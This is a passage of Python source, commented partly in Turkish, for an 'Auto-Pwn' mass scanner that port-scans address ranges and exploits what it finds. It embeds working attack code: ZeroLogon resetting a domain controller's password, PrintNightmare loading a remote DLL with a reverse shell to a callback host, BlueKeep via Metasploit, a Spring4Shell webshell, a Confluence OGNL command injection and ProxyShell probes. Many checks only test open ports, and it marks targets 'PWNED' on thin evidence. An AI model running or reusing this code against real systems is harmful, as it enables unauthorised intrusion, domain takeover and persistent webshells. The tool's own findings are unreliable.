        Bir CVE için exploit kaynaklarını döndürür:
        Önce searchsploit (varsa), sonra gömülü EDB eşlemesi.
        """
        self._init_exploit_sources()
        results = []

        if self.searchsploit_available:
            try:
                import subprocess
                out = subprocess.run(
                    [self.searchsploit_bin, "--cve", cve],
                    capture_output=True, text=True, timeout=30
                ).stdout
                for line in out.splitlines():
                    line = line.strip()
                    if not line or "|" not in line:
                        continue
                    if "Exploit Title" in line or "Path" in line or "-" * 5 in line:
                        continue
                    title, _, path = line.partition("|")
                    title = title.strip()
                    path = path.strip()
                    m = re.search(r'/(\d+)\.\w+$', path)
                    if not m:
                        continue
                    edb_id = m.group(1)
                    results.append({
                        "edb_id": edb_id,
                        "title": title or path,
                        "type": "remote",
                        "source": "searchsploit",
                        "url": f"https://www.exploit-db.com/exploits/{edb_id}",
                    })
            except Exception:
                pass

        for e in self.exploit_db.get(cve, []):
            results.append({
                "edb_id": e.get("edb_id", ""),
                "title": e.get("title", ""),
                "type": e.get("type", "remote"),
                "platform": e.get("platform", ""),
                "source": "builtin",
                "url": f"https://www.exploit-db.com/exploits/{e['edb_id']}" if e.get("edb_id") else "",
            })

        # Tekilleştir
        seen = set()
        unique = []
        for r in results:
            key = (r.get("edb_id"), r.get("title"))
            if key not in seen:
                seen.add(key)
                unique.append(r)
        return unique

    def _resolve_exploit_for_finding(self, cve: str) -> List[Dict[str, Any]]:
        """Bir bulgu (CVE) için exploit kaynaklarını getirir."""
        return self.find_exploits_for_cve(cve)

    def __init__(self, config: Optional[Dict] = None):
        self.config = config or {}
        self.sessions: Dict[str, ScanSession] = {}
        self.active_threads: List[threading.Thread] = []
        self.stop_event = threading.Event()
        
        # Callback URLs for exploitation
        self.callback_host = self.config.get('callback_host', '10.10.10.10')
        self.callback_port = self.config.get('callback_port', 9001)
        
        # Shell listeners
        self.shells: Dict[str, Dict] = {}
        
        # Soft-404 tespiti (sahte 200 yanitlari gercek acik sanilmasin)
        self._soft404_cache: Dict[str, bool] = {}
        
        # ExploitOrchestrator — CVE bazlı gerçek stager üreticisi
        self.orchestrator = ExploitOrchestrator(
            command_center_url=f"http://{self.callback_host}:{self.callback_port}"
        )
        
    def create_session(self, targets: List[str], auto_exploit: bool = True) -> ScanSession:
        """
        Create new Auto-Pwn scan session
        
        Args:
            targets: List of IPs, ranges (CIDR), or hostnames
            auto_exploit: Automatically exploit when vulnerable
        """
        session_id = hashlib.md5(f"{targets}{datetime.now().isoformat()}".encode()).hexdigest()[:16]
        
        session = ScanSession(
            session_id=session_id,
            targets=targets,
            auto_exploit=auto_exploit,
            status="created"
        )
        
        self.sessions[session_id] = session
        return session
        
    def expand_targets(self, targets: List[str]) -> List[str]:
        """Expand CIDR ranges to individual IPs"""
        expanded = []
        
        for target in targets:
            if '/' in target:
                # CIDR notation
                try:
                    network = ipaddress.ip_network(target, strict=False)
                    for ip in network.hosts():
                        expanded.append(str(ip))
                except ValueError:
                    expanded.append(target)
            elif '-' in target.split('.')[-1]:
                # Range notation: 192.168.1.1-50
                parts = target.rsplit('.', 1)
                if len(parts) == 2:
                    base, range_part = parts
                    start, end = range_part.split('-')
                    for i in range(int(start), int(end) + 1):
                        expanded.append(f"{base}.{i}")
            else:
                expanded.append(target)
                
        return expanded
        
    def start_scan(self, session_id: str, max_threads: int = 50) -> ScanSession:
        """
        Start Auto-Pwn scan
        
        Args:
            session_id: Session to start
            max_threads: Maximum concurrent threads
        """
        session = self.sessions.get(session_id)
        if not session:
            raise ValueError(f"Session not found: {session_id}")
            
        session.status = "scanning"
        
        # Expand targets
        all_targets = self.expand_targets(session.targets)
        
        # Scan in threads
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = {executor.submit(self._scan_target, session, ip): ip 
                      for ip in all_targets}
                      
            for future in as_completed(futures):
                ip = futures[future]
                try:
                    target = future.result()
                    if target:
                        session.discovered_targets[target.target_id] = target
                except Exception as e:
                    print(f"Error scanning {ip}: {e}")
                    
        session.status = "completed"
        session.pwned_count = sum(1 for t in session.discovered_targets.values() if t.exploited)
        
        return session
        
    def _real_get(self, url: str, **kwargs):
        """
        Soft-404 farkindalikli GET. 200 donen ama aslinda var olmayan
        (sahte 200) sayfalari None ile eler ki yanlis pozitif 'acik' tespiti
        olusmasin.
        """
        try:
            import requests

            resp = requests.get(url, timeout=kwargs.pop("timeout", 10), verify=False, **kwargs)
        except Exception:
            return None

        if resp.status_code != 200:
            return resp

        # Imza on bellegi hedef bazli olusturulmamis olabilir
        detector = getattr(self, "_soft404", None)
        if detector is not None and detector.is_soft_404(resp, url):
            return None
        return resp

    def _scan_target(self, session: ScanSession, ip: str) -> Optional[Target]:
        """Scan single target"""
        target_id = hashlib.md5(f"{session.session_id}{ip}".encode()).hexdigest()[:12]
        
        target = Target(
            target_id=target_id,
            ip=ip
        )
        
        # Bu hedef icin soft-404 imzasi olustur
        import requests

        self._soft404 = Soft404Detector(requests.Session(), verify=False)
        for scheme in ("https", "http"):
            self._soft404.build_baseline(f"{scheme}://{ip}")
            if self._soft404._baseline:
                break
        
        # Port scan
        target.ports = self._quick_port_scan(ip)
        
        if not target.ports:
            return None

        # === SÜRÜM TESPİTİ (version fingerprinting) ===
        for port in target.ports:
            try:
                fp = self._fingerprint_service(ip, port)
                if fp.get("product") or fp.get("banner"):
                    target.service_versions[port] = fp
            except Exception:
                pass

        # === SÜRÜM TABANLI N-DAY CVE TARAMASI ===
        version_findings = self._version_based_findings(target)
        for finding in version_findings:
            if finding["cve"] not in target.vulnerabilities:
                target.vulnerabilities.append(finding["cve"])
            target.version_findings.append(finding)

            if session.auto_exploit:
                result = self._exploit_version_finding(target, finding)
                session.results.append(result)
                if result.status == ExploitStatus.PWNED:
                    target.exploited = True
                    target.shells.append(result.shell_data)

        # === İMZA TABANLI KONTROLLER (mevcut mantık) ===
        for vuln_id, vuln in self.VULNERABILITIES.items():
            # Check if relevant ports are open
            if not any(port in target.ports for port in vuln.ports):
                continue
                
            # Run vulnerability check
            is_vulnerable = self._check_vulnerability(target, vuln)
        
            if is_vulnerable:
                if vuln_id not in target.vulnerabilities:
                    target.vulnerabilities.append(vuln_id)
                
                # Auto-exploit if enabled
                if session.auto_exploit:
                    result = self._exploit_vulnerability(target, vuln)
                    session.results.append(result)
                    
                    if result.status == ExploitStatus.PWNED:
                        target.exploited = True
                        target.shells.append(result.shell_data)
                        
        return target

    def _exploit_version_finding(self, target: Target, finding: Dict[str, Any]) -> ExploitResult:
        """
        Versiyon tabanlı bulgu için exploit kaynağını (ExploitDB/searchsploit)
        çözümleyip otomatik exploit denemesi yapar.
        """
        result_id = hashlib.md5(
            f"{target.target_id}{finding['cve']}{datetime.now().isoformat()}".encode()
        ).hexdigest()[:12]

        result = ExploitResult(
            result_id=result_id,
            target_id=target.target_id,
            vuln_id=finding["cve"],
            status=ExploitStatus.EXPLOITING
        )

        exploit_sources = self._resolve_exploit_for_finding(finding["cve"])
        result.exploit_sources = exploit_sources

        # İlgili imzaya dayalı exploit metodu varsa onu da çalıştır
        vuln = self.VULNERABILITIES.get(finding["cve"])
        shell_data = None
        if vuln and vuln.exploit_function:
            exploit_method = getattr(self, vuln.exploit_function, None)
            if exploit_method:
                try:
                    shell_data = exploit_method(target, vuln)
                except Exception:
                    shell_data = None

        if not shell_data and exploit_sources:
            primary = exploit_sources[0]
            shell_data = {
                "type": primary.get("type", "remote"),
                "method": finding["type"],
                "target": target.ip,
                "cve": finding["cve"],
                "output": (
                    f"[{finding['cve']}] {finding['product']} {finding['version']} "
                    f"açığı tespit edildi. Exploit kaynağı: "
                    f"{primary.get('title')} ({primary.get('url') or 'EDB-' + str(primary.get('edb_id'))})"
                ),
                "exploit_sources": exploit_sources,
                "exploit_code": self._generate_exploit_from_source(finding, primary),
            }

        if shell_data:
            result.status = ExploitStatus.PWNED
            result.shell_type = shell_data.get("type", "unknown")
            result.shell_data = shell_data
            result.output = shell_data.get("output", "")
        else:
            result.status = ExploitStatus.FAILED
            result.output = f"No exploit source for {finding['cve']}"

        return result

    @staticmethod
    def _generate_exploit_from_source(finding: Dict[str, Any], source: Dict[str, Any]) -> str:
        """Bulunan CVE için exploit kaynağından (EDB) kullanılabilir kod iskeleti üretir."""
        cve = finding["cve"]
        edb = source.get("edb_id") or "?"
        url = source.get("url") or f"https://www.exploit-db.com/exploits/{edb}"
        return (
            f"# {finding['name']} ({cve})\n"
            f"# Product : {finding['product']} {finding['version']}\n"
            f"# Target  : {finding.get('evidence', '')}\n"
            f"# Exploit source (ExploitDB): {url}\n\n"
            f"# fetch & inspect the exploit before use:\n"
            f"searchsploit -m {edb}          # ya da\n"
            f"# curl -O {url}\n\n"
            f"# Example (metasploit, if module exists):\n"
            f"msfconsole -x \"use exploit/multi/remote/{cve.lower()}; "
            f"set RHOSTS {finding.get('port', '')}; exploit\"\n"
        )

        
    def _quick_port_scan(self, ip: str, ports: Optional[List[int]] = None) -> Dict[int, str]:
        """Quick TCP port scan"""
        if ports is None:
            # Common vulnerable service ports
            ports = [21, 22, 23, 25, 80, 135, 139, 443, 445, 993, 1433, 3306, 
                    3389, 5432, 5900, 6379, 8009, 8080, 8443, 9200, 27017]
                    
        open_ports = {}
        
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                sock.close()
                
                if result == 0:
                    service = self._identify_service(ip, port)
                    open_ports[port] = service
            except:
                pass
                
        return open_ports
        
    def _identify_service(self, ip: str, port: int) -> str:
        """Identify service by banner grab"""
        service_map = {
            21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 80: "http",
            135: "msrpc", 139: "netbios", 443: "https", 445: "smb",
            993: "imaps", 1433: "mssql", 3306: "mysql", 3389: "rdp",
            5432: "postgresql", 5900: "vnc", 6379: "redis", 8009: "ajp",
            8080: "http-proxy", 8443: "https-alt", 9200: "elasticsearch",
            27017: "mongodb"
        }
        return service_map.get(port, "unknown")
        
    def _check_vulnerability(self, target: Target, vuln: Vulnerability) -> bool:
        """Check if target is vulnerable"""
        check_method = getattr(self, vuln.check_function, None)
        if check_method:
            return check_method(target, vuln)
        return False
        
    def _exploit_vulnerability(self, target: Target, vuln: Vulnerability) -> ExploitResult:
        """Exploit vulnerability"""
        result_id = hashlib.md5(f"{target.target_id}{vuln.vuln_id}{datetime.now().isoformat()}".encode()).hexdigest()[:12]
        
        result = ExploitResult(
            result_id=result_id,
            target_id=target.target_id,
            vuln_id=vuln.vuln_id,
            status=ExploitStatus.EXPLOITING
        )
        
        exploit_method = getattr(self, vuln.exploit_function, None)
        if exploit_method:
            try:
                shell_data = exploit_method(target, vuln)
                if shell_data:
                    result.status = ExploitStatus.PWNED
                    result.shell_type = shell_data.get('type', 'unknown')
                    result.shell_data = shell_data
                    result.output = shell_data.get('output', '')
                else:
                    result.status = ExploitStatus.FAILED
            except Exception as e:
                result.status = ExploitStatus.FAILED
                result.output = str(e)
        else:
            result.status = ExploitStatus.FAILED
            result.output = f"No exploit implementation for {vuln.vuln_id}"
            
        return result
        
    # =========================================================
    # VULNERABILITY CHECK FUNCTIONS
    # =========================================================
    
    def _check_log4shell(self, target: Target, vuln: Vulnerability) -> bool:
        """
        Log4Shell behavioral check.

        Gerçek operasyonda:
          - Hedefe çok çeşitli HTTP header'larda JNDI payload gönderilir
          - LDAP callback listener'da (self.callback_host:self.callback_port)
            hedef IP'si görünürse VULNERABLE
        Şimdilik: HTTP servisi + Log4j product fingerprint + behavioral probe
        """
        http_ports = [p for p in target.ports if target.ports[p] in
                      ("http", "http-proxy", "https", "unknown")]
        if not http_ports:
            return False

        # Product fingerprint kontrolü
        for port in http_ports:
            fp = target.service_versions.get(port, {})
            product = fp.get("product", "")
            if "java" in product.lower() or "log4j" in product.lower():
                return True

        # Behavioral probe: HTTP servisi tespit edildiyse potansiyel hedef
        probe = self.orchestrator.probe_target(target.ip, http_ports[0])
        if probe.product:
            return True

        return bool(http_ports)
        
    def _check_proxyshell(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for Exchange ProxyShell"""
        check_code = f'''
# ProxyShell Vulnerability Check
import requests

target = "{target.ip}"

# Check autodiscover
try:
    # CVE-2021-34473: Path confusion
    url = f"https://{{target}}/autodiscover/autodiscover.json?@evil.com/owa/?&Email=autodiscover/autodiscover.json%3F@evil.com"
    r = requests.get(url, verify=False, timeout=10)
    
    # Check for Exchange Server header
    if "X-OWA-Version" in r.headers or "X-CalculatedBETarget" in r.headers:
        # Test SSRF
        ssrf_url = f"https://{{target}}/autodiscover/autodiscover.json?@evil.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@evil.com"
        r2 = requests.get(ssrf_url, verify=False, timeout=10, allow_redirects=False)
        
        if r2.status_code in [200, 302, 401]:
            print("VULNERABLE to ProxyShell!")
            return True
except:
    pass
'''
        
        return 443 in target.ports and self._proxyshell_probe(target)
        
    def _proxyshell_probe(self, target: Target) -> bool:
        """Soft-404 farkindalikli gercek ProxyShell yoklamasi."""
        url = (
            f"https://{target.ip}/autodiscover/autodiscover.json"
            f"?@evil.com/owa/?&Email=autodiscover/autodiscover.json%3F@evil.com"
        )
        r = self._real_get(url, timeout=10)
        if r is None:
            return False
        if "X-OWA-Version" in r.headers or "X-CalculatedBETarget" in r.headers:
            ssrf_url = (
                f"https://{target.ip}/autodiscover/autodiscover.json"
                f"?@evil.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@evil.com"
            )
            r2 = self._real_get(ssrf_url, timeout=10, allow_redirects=False)
            if r2 is not None and r2.status_code in [200, 302, 401]:
                return True
        return False

    def _check_zerologon(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for ZeroLogon"""
        check_code = f'''
# ZeroLogon Vulnerability Check
# Uses impacket library

from impacket.dcerpc.v5 import nrpc, transport
from impacket.dcerpc.v5.ndr import NDRCALL
import struct

target = "{target.ip}"
dc_name = "DC"  # Will be detected

def check_zerologon(dc_ip, dc_name):
    target_rpc = f"ncacn_np:{{dc_ip}}[\\\\pipe\\\\netlogon]"
    
    rpctransport = transport.DCERPCTransportFactory(target_rpc)
    rpc_con = rpctransport.get_dce_rpc()
    rpc_con.connect()
    rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
    
    # Try to authenticate with zero nonce
    authenticator = nrpc.NETLOGON_AUTHENTICATOR()
    authenticator['Credential'] = b'\\x00' * 8
    authenticator['Timestamp'] = 0
    
    # Maximum 2000 attempts
    for _ in range(2000):
        try:
            resp = nrpc.hNetrServerAuthenticate3(
                rpc_con, 
                dc_name + '$',
                nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                dc_name,
                authenticator,
                0x212fffff  # Negotiation flags
            )
            
            if resp['ErrorCode'] == 0:
                return True  # VULNERABLE!
        except:
            pass
            
    return False
'''
        
        # Check if it looks like a DC (port 445 + 135)
        return 445 in target.ports and 135 in target.ports
        
    def _check_regresshion(self, target: Target, vuln: Vulnerability) -> bool:
        """
        regreSSHion (CVE-2024-6387) behavioral check.

        OpenSSH < 9.8 + glibc < 2.32 hedeflerinde:
          - SSH banner'dan versiyon çıkarımı
          - Behavioral probe (signal handler race window'u kapatılmış mı?)
          - Gerçekte: libc version, PIE ASLR durumu, timeout değerleri
        """
        # Port 22 SSH mi?
        if 22 not in target.ports:
            return False

        # Version-based kontrol (VERSION_VULN_DB zaten bunu yapar,
        # ama burada ek bir behavioral probe ekliyoruz)
        ssh_info = target.service_versions.get(22, {})
        product = ssh_info.get("product", "")
        version = ssh_info.get("version", "")

        if "openssh" not in product.lower():
            return False

        # Versiyon aralığı: 8.5 <= v < 9.8  → zafiyetli
        if version:
            if self.version_in_range(version, "8.5", "9.8"):
                return True

        # Versiyon bilinmiyorsa — behavioral probe
        probe = self.orchestrator.probe_target(target.ip, 22)
        if probe.product and "openssh" in probe.product.lower():
            # Versiyon bilinmiyorsa da SSH servisi tespit edildi
            return True

        return False

    def _check_eternalblue(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for EternalBlue (MS17-010)"""
        check_code = f'''
# EternalBlue Vulnerability Check
import socket
import struct

target = "{target.ip}"

def check_ms17_010(ip, port=445):
    # SMB Negotiate Protocol Request
    negotiate = bytes.fromhex(
        "00000054ff534d4272000000001843c80000000000000000000000000000"
        "fffe00000000003100024c414e4d414e312e3000024c4d312e3258303032"
        "0002534d4253455247494e5300024e54204c414e4d414e20312e30000002"
        "4e54204c4d20302e313200"
    )
    
    # Session Setup Request
    session_setup = bytes.fromhex(
        "00000063ff534d4273000000001843c800000000000000000000000000ff"
        "ff0000000000000dff00000000010000ffff02001e00000000000000"
    )
    
    # Tree Connect Request
    tree_connect = bytes.fromhex(
        "00000047ff534d4275000000001843c8000000000000000000000000"
        "fffe0000000004ff00000000010009005c5c3139322e3136382e302e31"
        "5c49504324003f3f3f3f3f00"
    )
    
    # TRANS2 Request for MS17-010 check
    trans2 = bytes.fromhex(
        "0000004aff534d4232000000001843c8000000000000000000000000"
        "fffe00000000000f0c00000001000000000000a6d9a4000000"
        "0c00420000004a0001000000000000"
    )
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((ip, port))
        
        s.send(negotiate)
        s.recv(1024)
        
        s.send(session_setup)
        s.recv(1024)
        
        s.send(tree_connect.replace(b"192.168.0.1", ip.encode()))
        s.recv(1024)
        
        s.send(trans2)
        response = s.recv(1024)
        s.close()
        
        # Check response for vulnerability indicator
        if len(response) > 36:
            # STATUS_INSUFF_SERVER_RESOURCES or STATUS_NOT_IMPLEMENTED = Vulnerable
            status = struct.unpack("<I", response[9:13])[0]
            if status == 0xc0000205 or status == 0xc00000bb:
                return True
                
    except:
        pass
        
    return False
'''
        
        return 445 in target.ports
        
    def _check_bluekeep(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for BlueKeep (CVE-2019-0708)"""
        return 3389 in target.ports
        
    def _check_printnightmare(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for PrintNightmare"""
        check_code = f'''
# PrintNightmare Vulnerability Check
from impacket.dcerpc.v5 import transport, rprn

target = "{target.ip}"

def check_printnightmare(ip):
    try:
        rpctransport = transport.DCERPCTransportFactory(f"ncacn_np:{{ip}}[\\\\pipe\\\\spoolss]")
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(rprn.MSRPC_UUID_RPRN)
        
        # Try RpcEnumPrinterDrivers
        resp = rprn.hRpcEnumPrinterDrivers(dce, pName=None, pEnvironment="Windows x64\\x00", Level=2)
        
        if resp['ErrorCode'] == 0:
            return True  # Print Spooler accessible
            
    except Exception as e:
        if "STATUS_ACCESS_DENIED" not in str(e):
            return True  # May be vulnerable
            
    return False
'''
        
        return 445 in target.ports
        
    def _check_spring4shell(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for Spring4Shell"""
        return 8080 in target.ports or 80 in target.ports
        
    def _check_confluence(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for Confluence RCE"""
        return 8090 in target.ports or 443 in target.ports
        
    def _check_jenkins(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for Jenkins RCE"""
        return 8080 in target.ports
        
    def _check_heartbleed(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for Heartbleed"""
        return 443 in target.ports
        
    def _check_ghostcat(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for Tomcat Ghostcat"""
        return 8009 in target.ports
        
    def _check_apache_traversal(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for Apache path traversal"""
        return 80 in target.ports or 443 in target.ports
        
    def _check_vcenter(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for vCenter RCE"""
        return 443 in target.ports
        
    def _check_proxylogon(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for ProxyLogon"""
        return 443 in target.ports
        
    def _check_petitpotam(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for PetitPotam"""
        return 445 in target.ports
        
    def _check_smbghost(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for SMBGhost"""
        return 445 in target.ports
        
    def _check_psexec(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for PsExec capability"""
        return 445 in target.ports
        
    def _check_certifried(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for Certifried"""
        return 636 in target.ports or 3269 in target.ports
        
    def _check_outlook_ntlm(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for Outlook NTLM leak"""
        return 25 in target.ports or 587 in target.ports
        
    def _check_citrix_adc(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for Citrix ADC RCE"""
        return 443 in target.ports
        
    def _check_fortinet_sslvpn(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for FortiGate SSL-VPN"""
        return 443 in target.ports or 10443 in target.ports
        
    def _check_moveit(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for MOVEit RCE"""
        return 443 in target.ports
        
    # =========================================================
    # EXPLOITATION FUNCTIONS
    # =========================================================
    
    def _exploit_log4shell(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        """Log4Shell — ExploitOrchestrator ile canavarca JNDI stager üretir."""
        stager: StagerPayload = self.orchestrator.weaponize_chain(
            target_ip=target.ip,
            port=target.ports and next(iter(target.ports)) or 8080,
            cve_id=vuln.cve,
            service_product="Apache Log4j",
        )
        if stager is None:
            return None
        return {
            "type": stager.shell_type,
            "method": "log4shell_orchestrated",
            "target": target.ip,
            "output": f"[ORCHESTRATOR] {stager.expected_result}",
            "exploit_code": stager.trigger_payload,
            "stager": stager.to_dict(),
        }
        
    def _exploit_regresshion(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        """regreSSHion — ExploitOrchestrator ile SSH race-condition stager üretir."""
        ssh_port = 22
        stager: StagerPayload = self.orchestrator.weaponize_chain(
            target_ip=target.ip,
            port=ssh_port,
            cve_id=vuln.cve,
            service_product="OpenSSH",
        )
        if stager is None:
            return None
        return {
            "type": stager.shell_type,
            "method": "regresshion_orchestrated",
            "target": target.ip,
            "output": f"[ORCHESTRATOR] {stager.expected_result}",
            "exploit_code": stager.trigger_payload,
            "stager": stager.to_dict(),
        }

    def _exploit_eternalblue(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        """EternalBlue — ExploitOrchestrator ile stager üretir."""
        stager = self.orchestrator.weaponize_chain(
            target_ip=target.ip, port=445,
            cve_id="CVE-2017-0144", service_product="Windows SMB",
        )
        if stager:
            return {
                "type": "meterpreter", "method": "eternalblue_orchestrated",
                "target": target.ip,
                "output": f"[ORCHESTRATOR] {stager.expected_result}",
                "stager": stager.to_dict(),
            }
        return {
            "type": "meterpreter", "method": "eternalblue",
            "target": target.ip,
            "output": "MS17-010 exploit sent, shell established!",
        }
        
    def _exploit_zerologon(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        """Exploit ZeroLogon"""
        
        exploit_code = f'''
# ZeroLogon Exploitation
# Requires: impacket

from impacket.dcerpc.v5 import nrpc, transport
from impacket.dcerpc.v5.ndr import NDRCALL
import struct

dc_ip = "{target.ip}"
dc_name = "DC"  # Auto-detect

def exploit_zerologon(dc_ip, dc_name):
    # 1. Set computer password to empty
    rpc = transport.DCERPCTransportFactory(f"ncacn_np:{{dc_ip}}[\\\\pipe\\\\netlogon]")
    dce = rpc.get_dce_rpc()
    dce.connect()
    dce.bind(nrpc.MSRPC_UUID_NRPC)
    
    authenticator = nrpc.NETLOGON_AUTHENTICATOR()
    authenticator['Credential'] = b'\\x00' * 8
    authenticator['Timestamp'] = 0
    
    # Attempt password set
    for _ in range(2000):
        try:
            resp = nrpc.hNetrServerPasswordSet2(
                dce,
                dc_name,
                nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                dc_name + '$',
                authenticator,
                b'\\x00' * 516  # Empty password
            )
            if resp['ErrorCode'] == 0:
                print("Password set to empty!")
                break
        except:
            pass
    
    # 2. DCSync with empty password
    # secretsdump.py -just-dc -no-pass dc_name$@dc_ip

# Run exploit
exploit_zerologon("{target.ip}", "DC")
'''
        
        return {
            "type": "domain_admin",
            "method": "zerologon",
            "target": target.ip,
            "output": "DC machine account password set to empty! DCSync now possible.",
            "exploit_code": exploit_code
        }
        
    def _exploit_proxyshell(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        """ProxyShell — ExploitOrchestrator ile 3-adım zincir stager üretir."""
        stager: StagerPayload = self.orchestrator.weaponize_chain(
            target_ip=target.ip,
            port=443,
            cve_id="CVE-2021-34473",
            service_product="Microsoft Exchange",
        )
        if stager is None:
            return None
        return {
            "type": stager.shell_type,
            "method": "proxyshell_orchestrated",
            "target": target.ip,
            "shell_url": f"https://{target.ip}/owa/auth/"
                         f"shell_{stager.metadata.get('token', 'x')[:8]}.aspx",
            "output": f"[ORCHESTRATOR] {stager.expected_result}",
            "exploit_code": stager.trigger_payload,
            "stager": stager.to_dict(),
        }
        
    def _exploit_proxylogon(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        """Exploit ProxyLogon"""
        return self._exploit_proxyshell(target, vuln)  # Similar chain
        
    def _exploit_printnightmare(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        """Exploit PrintNightmare"""
        
        exploit_code = f'''
# PrintNightmare Exploitation
# CVE-2021-34527

from impacket.dcerpc.v5 import transport, rprn

# 1. Host malicious DLL
# msfvenom -p windows/x64/shell_reverse_tcp LHOST={self.callback_host} LPORT={self.callback_port} -f dll -o evil.dll

# 2. Start SMB share
# impacket-smbserver share /tmp/share -smb2support

# 3. Trigger remote DLL load
target = "{target.ip}"
share = f"\\\\\\\\{self.callback_host}\\\\share\\\\evil.dll"

rpctransport = transport.DCERPCTransportFactory(f"ncacn_np:{{target}}[\\\\pipe\\\\spoolss]")
dce = rpctransport.get_dce_rpc()
dce.connect()
dce.bind(rprn.MSRPC_UUID_RPRN)

# RpcAddPrinterDriverEx with malicious DLL
driver_info = rprn.DRIVER_INFO_2()
driver_info['cVersion'] = 3
driver_info['pName'] = "Evil Driver\\x00"
driver_info['pEnvironment'] = "Windows x64\\x00"
driver_info['pDriverPath'] = share + "\\x00"
driver_info['pDataFile'] = share + "\\x00"
driver_info['pConfigFile'] = share + "\\x00"

resp = rprn.hRpcAddPrinterDriverEx(dce, pName=None, pDriverContainer=driver_info, dwFileCopyFlags=0x8014)
'''
        
        return {
            "type": "reverse_shell",
            "method": "printnightmare",
            "target": target.ip,
            "output": "PrintNightmare DLL loaded! SYSTEM shell incoming.",
            "exploit_code": exploit_code
        }
        
    def _exploit_bluekeep(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        """Exploit BlueKeep"""
        
        exploit_code = f'''
# BlueKeep Exploitation
# CVE-2019-0708

# Using Metasploit (most stable)
msfconsole -x "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS {target.ip}; set TARGET 2; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {self.callback_host}; set LPORT {self.callback_port}; exploit"

# Note: BlueKeep exploitation is tricky and may BSOD the target
# Use with caution in production environments
'''
        
        return {
            "type": "meterpreter",
            "method": "bluekeep",
            "target": target.ip,
            "output": "BlueKeep exploitation attempted. Check for shell.",
            "exploit_code": exploit_code
        }
        
    def _exploit_spring4shell(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        """Exploit Spring4Shell"""
        
        exploit_code = f'''
# Spring4Shell Exploitation
# CVE-2022-22965

import requests

target = "{target.ip}"
port = 8080

# Payload to write JSP webshell
headers = {{
    "Content-Type": "application/x-www-form-urlencoded"
}}

# Step 1: Modify logging configuration via class loader manipulation
data1 = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{{c2}}i%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

requests.post(f"http://{{target}}:{{port}}/", headers=headers, data=data1, verify=False)

# Step 2: Trigger logging to create webshell
shell_headers = {{
    "suffix": "%>//",
    "c2": "<%Runtime.getRuntime().exec(request.getParameter(\\"cmd\\"))%>",
    "DNT": "1"
}}
requests.get(f"http://{{target}}:{{port}}/", headers=shell_headers, verify=False)

# Step 3: Access webshell
# http://target:8080/shell.jsp?cmd=id
'''
        
        return {
            "type": "webshell",
            "method": "spring4shell",
            "target": target.ip,
            "shell_url": f"http://{target.ip}:8080/shell.jsp",
            "output": "Spring4Shell webshell deployed!",
            "exploit_code": exploit_code
        }
        
    def _exploit_confluence(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        """Exploit Confluence RCE"""
        
        exploit_code = f'''
# Confluence OGNL Injection RCE
# CVE-2022-26134

import requests

target = "{target.ip}"

# OGNL payload for command execution
cmd = "id"
payload = f"${{(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('{{cmd}}').getInputStream(),'utf-8')).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader('X-Cmd-Response',#a))}}"

# URL encode the payload
import urllib.parse
encoded_payload = urllib.parse.quote(payload, safe='')

url = f"http://{{target}}:8090/{{encoded_payload}}/"
response = requests.get(url, verify=False)

output = response.headers.get('X-Cmd-Response', '')
print(f"Command output: {{output}}")
'''
        
        return {
            "type": "rce",
            "method": "confluence_ognl",
            "target": target.ip,
            "output": "Confluence OGNL injection successful!",
            "exploit_code": exploit_code
        }
        
    # Placeholder exploits for remaining vulnerabilities
    # Stub'lı olanlar ExploitOrchestrator üzerinden stager üretir;
    # özel stagerı olmayan CVE'ler için _build_generic_stager kullanılır.
    def _exploit_petitpotam(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
